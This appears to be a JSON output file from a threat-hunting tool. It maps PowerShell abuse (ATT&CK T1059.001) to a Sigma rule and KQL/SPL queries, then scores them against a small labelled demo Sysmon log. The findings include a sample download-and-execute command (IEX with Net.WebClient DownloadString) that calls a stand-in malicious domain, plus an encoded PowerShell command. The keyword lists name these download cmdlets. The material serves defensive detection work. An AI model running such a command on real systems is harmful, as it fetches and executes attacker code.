@@ -1,0 +1,202 @@
+{
+  "cti_input": {
+    "technique_id": "T1059.001",
+    "technique_name": "PowerShell",
+    "evidence": "The attacker utilized PowerShell to download the payload from a remote server using Invoke-Expression.",
+    "iocs": {
+      "ips": [
+        "192.168.1.100",
+        "45.33.22.11"
+      ],
+      "domains": [
+        "malicious-payload.com"
+      ],
+      "hashes": [
+        "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
+      ],
+      "emails": [
+        "admin@evilcorp.com"
+      ]
+    }
+  },
+  "hunting_plan": {
+    "technique_id": "T1059.001",
+    "technique_name": "Command and Scripting Interpreter: PowerShell",
+    "tactic": [
+      "Execution"
+    ],
+    "supported": true,
+    "hypothesis": "An adversary may be abusing PowerShell to execute encoded or download-and-execute commands on Windows endpoints.",
+    "telemetry": [
+      "Sysmon Event ID 1 - Process Create",
+      "PowerShell Operational / Script Block Logging (Event ID 4104)",
+      "Windows process creation auditing (if enabled)"
+    ],
+    "evidence": "The attacker utilized PowerShell to download the payload from a remote server using Invoke-Expression.",
+    "sigma_rule": "title: \"Suspicious PowerShell Execution\"\nstatus: experimental\ndescription: \"Baseline hunting rule generated from CTI ATT&CK mapping.\"\nreferences:\n  - https://attack.mitre.org/techniques/T1059/001/\ntags:\n  - attack.t1059.001\nlogsource:\n  category: process_creation\n  product: windows\ndetection:\n  selection_image:\n    Image|endswith:\n      - '\\powershell.exe'\n      - '\\pwsh.exe'\n  selection_keywords:\n    CommandLine|contains:\n      - \"-enc\"\n      - \"-encodedcommand\"\n      - \"Invoke-Expression\"\n      - \"IEX(\"\n      - \"DownloadString\"\n      - \"DownloadFile\"\n      - \"FromBase64String\"\n      - \"Invoke-WebRequest\"\n      - \"New-Object Net.WebClient\"\n  condition: selection_image and selection_keywords\nfalsepositives:\n  - Legitimate administrative activity\nlevel: medium\n",
+    "queries": {
+      "kql_reference": "SecurityEvents | where (Image endswith \"\\\\powershell.exe\" or Image endswith \"\\\\pwsh.exe\") and (CommandLine contains \" -enc \" or CommandLine contains \" -encodedcommand \" or CommandLine contains \"invoke-expression\" or CommandLine contains \" iex(\" or CommandLine contains \"downloadstring\" or CommandLine contains \"downloadfile\" or CommandLine contains \"frombase64string\" or CommandLine contains \"invoke-webrequest\" or CommandLine contains \" iwr \" or CommandLine contains \"new-object net.webclient\") | extend TechniqueId=\"T1059.001\"",
+      "spl_reference": "index=security (Image=\"*\\\\powershell.exe\" OR Image=\"*\\\\pwsh.exe\") (CommandLine=\"* -enc *\" OR CommandLine=\"* -encodedcommand *\" OR CommandLine=\"*invoke-expression*\" OR CommandLine=\"* iex(*\" OR CommandLine=\"*downloadstring*\" OR CommandLine=\"*downloadfile*\" OR CommandLine=\"*frombase64string*\" OR CommandLine=\"*invoke-webrequest*\" OR CommandLine=\"* iwr *\" OR CommandLine=\"*new-object net.webclient*\") | eval TechniqueId=\"T1059.001\""
+    },
+    "created_at": "2026-08-19T08:32:12.756747+00:00"
+  },
+  "log_source": "windows_sysmon_demo.jsonl",
+  "events_scanned": 10,
+  "matched_events": 2,
+  "findings": [
+    {
+      "event_index": 2,
+      "technique_id": "T1059.001",
+      "risk_score": 75,
+      "reasons": [
+        "event_id=1",
+        "suspicious process image",
+        "keywords= -encodedcommand "
+      ],
+      "event": {
+        "event_id": 1,
+        "timestamp": "2026-08-19T08:12:44Z",
+        "host": "WIN-02",
+        "source": "Microsoft-Windows-Sysmon/Operational",
+        "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "parent_image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+        "command_line": "powershell.exe -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA",
+        "user": "LAB\\bob",
+        "target_image": null,
+        "destination_ip": null,
+        "query_name": null,
+        "task_name": null,
+        "label": true,
+        "attack_technique": [
+          "T1059.001",
+          "T1566.001"
+        ]
+      }
+    },
+    {
+      "event_index": 3,
+      "technique_id": "T1059.001",
+      "risk_score": 65,
+      "reasons": [
+        "event_id=4104",
+        "keywords=downloadstring, new-object net.webclient"
+      ],
+      "event": {
+        "event_id": 4104,
+        "timestamp": "2026-08-19T08:12:45Z",
+        "host": "WIN-02",
+        "source": "Microsoft-Windows-PowerShell/Operational",
+        "image": null,
+        "parent_image": null,
+        "command_line": "IEX(New-Object Net.WebClient).DownloadString('http://malicious-payload.com/a.ps1')",
+        "user": "LAB\\bob",
+        "target_image": null,
+        "destination_ip": null,
+        "query_name": null,
+        "task_name": null,
+        "label": true,
+        "attack_technique": "T1059.001"
+      }
+    }
+  ],
+  "evaluation": {
+    "technique_id": "T1059.001",
+    "labeled_events": 10,
+    "tp": 2,
+    "fp": 0,
+    "tn": 8,
+    "fn": 0,
+    "precision": 1.0,
+    "recall": 1.0,
+    "f1": 1.0,
+    "false_positive_rate": 0.0,
+    "details": [
+      {
+        "event_index": 0,
+        "ground_truth": false,
+        "predicted": false,
+        "score": 1,
+        "reasons": [
+          "event_id=1"
+        ]
+      },
+      {
+        "event_index": 1,
+        "ground_truth": false,
+        "predicted": false,
+        "score": 3,
+        "reasons": [
+          "event_id=1",
+          "suspicious process image"
+        ]
+      },
+      {
+        "event_index": 2,
+        "ground_truth": true,
+        "predicted": true,
+        "score": 4,
+        "reasons": [
+          "event_id=1",
+          "suspicious process image",
+          "keywords= -encodedcommand "
+        ]
+      },
+      {
+        "event_index": 3,
+        "ground_truth": true,
+        "predicted": true,
+        "score": 3,
+        "reasons": [
+          "event_id=4104",
+          "keywords=downloadstring, new-object net.webclient"
+        ]
+      },
+      {
+        "event_index": 4,
+        "ground_truth": false,
+        "predicted": false,
+        "score": 0,
+        "reasons": []
+      },
+      {
+        "event_index": 5,
+        "ground_truth": false,
+        "predicted": false,
+        "score": 1,
+        "reasons": [
+          "event_id=1"
+        ]
+      },
+      {
+        "event_index": 6,
+        "ground_truth": false,
+        "predicted": false,
+        "score": 0,
+        "reasons": []
+      },
+      {
+        "event_index": 7,
+        "ground_truth": false,
+        "predicted": false,
+        "score": 1,
+        "reasons": [
+          "event_id=1"
+        ]
+      },
+      {
+        "event_index": 8,
+        "ground_truth": false,
+        "predicted": false,
+        "score": 0,
+        "reasons": []
+      },
+      {
+        "event_index": 9,
+        "ground_truth": false,
+        "predicted": false,
+        "score": 0,
+        "reasons": []
+      }
+    ]
+  }
+}
